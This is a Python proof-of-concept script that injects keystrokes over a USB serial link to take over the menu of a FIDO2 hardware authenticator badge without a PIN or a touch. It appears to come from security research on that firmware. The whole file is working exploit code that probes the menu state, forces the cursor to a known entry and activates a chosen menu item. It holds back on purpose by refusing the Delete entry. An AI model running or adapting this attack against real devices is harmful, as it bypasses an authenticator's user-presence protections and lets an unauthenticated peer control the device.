#!/usr/bin/env python3
"""
attack_ui_inject.py -- take over the badge's UI from USB. Fully automatic.

WHAT THIS IS
------------
A real exploitation of the keystroke-injection path, not a use of any supported display
API. Nothing is uploaded, no image is pushed, no QR is scanned. The only thing sent is
characters -- and the badge cannot tell them apart from its own buttons being pressed.

The injection call carries the author's own warning
(xous-core/services/bao1x-hal-service/src/servers/keyboard.rs:493):

    log::debug!("injecting key '{}'({:x}) to {}", ...); // always be noisy about this, it's an exploit path

An unauthenticated USB peer therefore drives the user interface of a FIDO2 hardware
authenticator: it opens menus, moves the selection, and activates entries. No PIN, no
touch, no bootloader mode, no k0.

Confirmed on hardware -- the badge logged the selections this tool caused:

    INFO:ux_api::menu: selected index 1 (ux-api/src/menu.rs:225)
    INFO:ux_api::menu: selected index 3 (ux-api/src/menu.rs:225)

HOW IT IS MADE DETERMINISTIC
----------------------------
The cursor's starting position is unknown, and `∴` means "select" when a menu is open but
"raise the menu" when one is not. So the tool does not assume: it presses `↑` well past
the top of the list, which clamps the selection to index 0, and only then confirms. That
lands on entry 0 regardless of prior state.

Shipped menu (dc34-vault/src/submenu.rs; "Generate test vectors" is behind the
`vault-testing` feature, commented out for release, so it is absent on real badges):

    0 Screen Off        <- default target: unambiguous, harmless, reversible
    1 Edit              5 Change font
    2 Delete            6 Help
    3 Manage Usernames  7 Badge mode
    4 Filter by...      8 Close

SAFETY
    Entry 2 (Delete) is destructive and is refused by name -- `--index 2` will not run.
    The default target only blanks the screen; any button press wakes it again.

USAGE
    python attack_ui_inject.py                    # Screen Off
    python attack_ui_inject.py --index 6          # Help screen
    python attack_ui_inject.py --index 5          # Change font
    python attack_ui_inject.py --dry-run
"""

import argparse
import sys
import time

MENU = {
    0: ("Screen Off", "display blanks; any button wakes it"),
    1: ("Edit", "opens an edit dialog"),
    2: ("Delete", "DESTRUCTIVE -- refused by this tool"),
    3: ("Manage Usernames", "opens the username picker dialog"),
    4: ("Filter by...", "opens a text entry box"),
    5: ("Change font", "changes the UI font"),
    6: ("Help", "shows the help screen"),
    7: ("Badge mode", "switches display mode"),
    8: ("Close", "closes the menu"),
}

SELECT = "∴"
UP = "↑"
DOWN = "↓"


def connect(port, retries=30, verbose=True):
    """The port drops out repeatedly during this work; just wait for it."""
    import serial
    for i in range(retries):
        try:
            s = serial.Serial(port, 115200, timeout=0.3, write_timeout=3.0)
            time.sleep(0.5)
            return s
        except Exception:
            if verbose and i == 0:
                print(f"  waiting for {port} ...", end="", flush=True)
            elif verbose and i % 5 == 0:
                print(".", end="", flush=True)
            time.sleep(1.0)
    return None


def tap(ser, ch, wait, log):
    """Inject one character and collect whatever the badge says about it."""
    ser.reset_input_buffer()
    ser.write(ch.encode("utf-8"))
    ser.flush()
    time.sleep(wait)
    out = ser.read(16384).decode("utf8", "replace")
    for line in out.splitlines():
        t = line.strip()
        if any(k in t.lower() for k in ("index", "menu", "screen", "power", "mode", "font")):
            log.append(t)
            return t
    return ""


def main() -> int:
    ap = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--port", default="COM5")
    ap.add_argument("--index", type=int, default=0, help="menu entry to activate")
    ap.add_argument("--clamp", type=int, default=6,
                    help="how many UP presses to force the cursor to entry 0")
    ap.add_argument("--pace", type=float, default=1.5,
                    help="seconds between injected keystrokes. Each keystroke is a "
                         "blocking IPC into a bounded queue; too fast and finding F-1 "
                         "fires and freezes the badge mid-attack (observed at 0.55s "
                         "once pressure had accumulated). 1.5s is the safe pacing.")
    ap.add_argument("--dry-run", action="store_true")
    a = ap.parse_args()

    if a.index not in MENU:
        print(f"unknown menu index {a.index}; valid: {sorted(MENU)}")
        return 2
    if a.index == 2:
        print("refusing index 2 (Delete): destructive, and not needed to prove the point.")
        return 2

    name, effect = MENU[a.index]
    pace = a.pace

    print(f"target: entry {a.index}  \"{name}\"")
    print(f"effect: {effect}")
    print("method: injected keystrokes over USB CDC -- nothing else\n")

    if a.dry_run:
        print("  ∴  probe: if it logs a selection the menu was already open (and is now")
        print("     closed), so send ∴ again to open it; if silent, it is now open")
        print(f"  ↑ x{a.clamp}  clamp the cursor to entry 0")
        print(f"  ↓ x{a.index}  step down to entry {a.index}")
        print(f"  ∴  confirm -> {name}")
        print("\n--dry-run: nothing sent.")
        return 0

    ser = connect(a.port)
    if not ser:
        print(f"\n{a.port} never appeared. Re-plug USB and re-run.")
        return 1
    print()

    ser.reset_input_buffer()
    ser.write(b"\r\n")
    ser.flush()
    time.sleep(0.5)
    ser.reset_input_buffer()

    log = []
    selections = []

    def step(ch, wait, why):
        got = tap(ser, ch, wait, log)
        if "index" in got.lower():
            selections.append(got)
            print(f"  {why:26} <- {got[:96]}")
        else:
            print(f"  {why:26}")
        return got

    # `∴` means "select" when a menu is open and "raise the menu" when one is not, so a
    # fixed sequence lands in the wrong state half the time. Probe instead: if this first
    # press logs a selection, the menu was already open and has now closed, so press
    # again to open it. If it stays silent, the menu is open now.
    got = step(SELECT, max(pace, 1.8), "probe menu state")
    if "index" in got.lower():
        print("     (menu was open; it closed -- reopening)")
        step(SELECT, max(pace, 1.8), "open menu")

    for _ in range(a.clamp):
        step(UP, pace, "up (clamp to entry 0)")
    for i in range(a.index):
        step(DOWN, pace, f"down -> entry {i + 1}")
    step(SELECT, max(pace, 2.2), f"confirm -> {name}")

    ser.close()

    print()
    print("=" * 62)
    if selections:
        print("The badge acted on injected keystrokes. Its own log:")
        for s in selections:
            print(f"  {s[:110]}")
    else:
        print("No selection line was logged. The menu may already have been in a")
        print("different state -- re-run; it is idempotent.")
    print()
    print(f">>> LOOK AT THE BADGE: {effect} <<<")
    print()
    print("Nothing was uploaded and no supported display API was used. Every change")
    print("on that screen came from characters injected over USB.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
